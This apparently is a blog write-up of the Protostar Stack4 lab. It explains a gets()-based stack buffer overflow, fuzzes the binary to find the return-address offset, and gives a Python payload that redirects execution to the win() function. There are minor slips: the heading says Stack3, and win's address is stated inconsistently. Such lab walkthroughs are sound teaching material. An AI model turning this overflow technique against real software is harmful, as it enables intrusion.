---
title: Protostar - Stack 4
date: 2024-02-14 20:32:00
categories: [binary-exploitation, protostar]
tags: [protostar, binary-exploitation, stack4]
---

# Conquering Stack3 at Protostar Machine
Hello ! Hex murders! 🏴‍☠️ Today, I set sail on a quest to conquer the [Stack4](https://exploit.education/protostar/stack-four/) challenge aboard the [Protostar](https://exploit.education/protostar) machine XD .

This time, we're on a mission to hijack the execuation flow and steer it straight into the welcoming arms of a function called `win` We Love `eip` hijacking hah ;). Get ready for some stack-bufferoverflow shenanigans.

This challenge requiring us to Redirect Execution to call function called `win` defined in the code useing through exploitation of stack-bufferoverflow.

### **Challenge Overview**
- **Challenge Name:** [Stack4](https://exploit.education/protostar/stack-four/)
- **Machine:** [Protostar](https://exploit.education/protostar)

### Step 1: Explore Binary
![Stack4 Explore](/assets/img/protostar/stack4-explore.png)
Again there is input ... Hmmm i think i know this function which prompt input XD .. , but i will not say :D .. you will know letter :) .
### Step 2: Analysis
![Stack4 Analsis](/assets/img/protostar/stack4-analysis.png)
1. Function Prologue:
   - `push ebp`: Save the base pointer.
   - `mov ebp, esp`: Set up a new base pointer.
   - `and esp, 0xfffffff0`: Align the stack.
   - `sub esp, 0x60`: Allocate space for local variables.
2. Create Pointer to Buffer on Stack and Store it in `[esp]` pointer:
- `lea eax, [esp+0x10]`: Load effective address into `eax`, pointin' to a spot in the stack space.
- `mov DWORD PTR [esp], eax`: Store the address pointed by `eax` at the top of the stack.
3. Function Calls:
- `call 804830c <gets@plt>`: Calling the gets function. But beware, gets be dangerous due to its lack of bounds checking. It be a prime target for exploiting! , so my friend . that is the function which i told you about ;)
4. Function Epilogue:
- `leave` Restore the stack frame. it is short for `mov esp,ebp` and `pop ebp`
- `ret` Return from the function. 
5. `win` Function address is at `0x080483f4` 

### Step 3: Debugging

#### Theory of instruction `call`

1. first when call a function program `push` current current eip address on stack 
2. then `jmp` to function which called 
3. function `push ebp` , and `mov ebp,esp` which is known as `Function Prologue` which is init stack frame
4. at the end of function when it finished it make  `Fucnction Epilogue` which is destory stack frame by `mov esp,ebp` then `pop ebp` which is also can be shorted as `leave` instruction
5. when execute `ret` in this function which called the `eip` `pop` the first value pushed before in the stack in step 1 which represent the `eip` value which is instruction after the function called to continue execute code that after function call

Now let,s fuzz & debug ! ;)

1. create fuzz script at `~/fuzz.py` contains:
```py
fuzz="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
print(fuzz)
```
2. debug binary with gdb and disassemble `main` 
3. break point at `leave` instruction in `main`
4. run binary with stdin from output of running `~/fuzz.py`
5. check fuzz value at ebp register
6. check fuzz value at eip register
![Stack4 Debug](/assets/img/protostar/stack4-gdb-debug.png)

![Stack4 Debug](/assets/img/protostar/stack4-gdb-debug2.png)
- `ebp` value now is `0x53535353` which is hexadecimal respresntation for  fuzz value `SSSS` 

![Stack4 Debug](/assets/img/protostar/stack4-gdb-debug3.png)
- and of course  `eip` value now is `0x54545454` which is hexadecimal respresntation for fuzz value `TTTT` 
- well done now let,s craft our solution

### Step 4: Crafting Solution 
okay let,s update our script: `~/fuzz.py`

```py
fuzz="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR"
ebp="SSSS"
eip="\xf4\x83\x04\x08" # represent 0x080483f4 on little endian machines. 0x080483f4 is address of win function
print(fuzz+ebp+eip)
```
now `eip` will have the address of `0x080483da` which is address for function `win`
let,s run our solution redirect outpur of `~/fuzz.py` to our beautiful binary `stack4`

![Stack4 Sloved](/assets/img/protostar/stack4-solved.png)

and now function `win` called .. 
We `win` !  .. CheckMate ;) 
See You in `stack5` ;)
